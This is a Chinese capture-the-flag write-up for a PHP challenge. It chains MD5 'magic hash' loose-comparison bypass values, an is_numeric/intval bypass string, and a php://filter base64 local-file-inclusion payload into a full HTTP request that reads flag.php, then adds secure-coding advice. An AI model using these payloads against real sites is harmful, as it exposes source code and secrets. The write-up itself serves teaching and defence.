# baby_php

## 题目简述

题目把三类 PHP 特性串在一起：`md5()` 结果的弱类型比较、`is_numeric()` 与 `intval()` 的解析差异，以及可控 `include()` 引发的 PHP 伪协议文件读取。必须依次通过所有判断，最后读取 `flag.php` 的源码。

## 解题过程

源码的关键条件可概括为：

```php
$first_check = $a != $b && md5($a) == md5($b);
$second_check = !is_numeric($c) && $c != 1024 && intval($c) == 1024;

if ($first_check && $second_check) {
    include($name . '.php');
}
```

第一组参数取 `a=240610708`、`b=s878926199a`。两者不同，但 MD5 都是以 `0e` 开头且其余部分全为数字的字符串；在松散比较 `==` 中，它们会按科学计数法数字转换为 `0`，因而相等。

第二组参数取 `c=1024.1a`。该字符串整体不是合法数字，所以 `is_numeric()` 为假；它也不与整数 `1024` 松散相等，但 `intval()` 从开头解析整数部分后得到 `1024`。

最后令 Cookie 中的 `name` 为：

```text
php://filter/read=convert.base64-encode/resource=flag
```

程序会在末尾追加 `.php`，实际包含的是 `php://filter/read=convert.base64-encode/resource=flag.php`。过滤器先把源文件转换为 Base64 文本，使 `include()` 无法把其中的 `<?php ... ?>` 当作代码执行，而是把编码结果输出；对响应做 Base64 解码即可得到 flag。

完整的最小请求如下：

```http
POST /?a=240610708&b=s878926199a HTTP/1.1
Host: target
Cookie: name=php://filter/read=convert.base64-encode/resource=flag
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

c=1024.1a
```

直接使用 `name=flag` 不会成功，因为 `include('flag.php')` 只会执行文件并定义 `$flag` 变量，当前页面没有输出该变量。

## 方法总结

核心是严格按 PHP 的类型转换和流包装器语义理解每个条件。安全代码应使用 `===` 比较摘要、对数字执行统一且严格的格式校验，并禁止用户输入进入 `include`；若确需包含文件，应使用固定白名单和不可控的绝对路径。
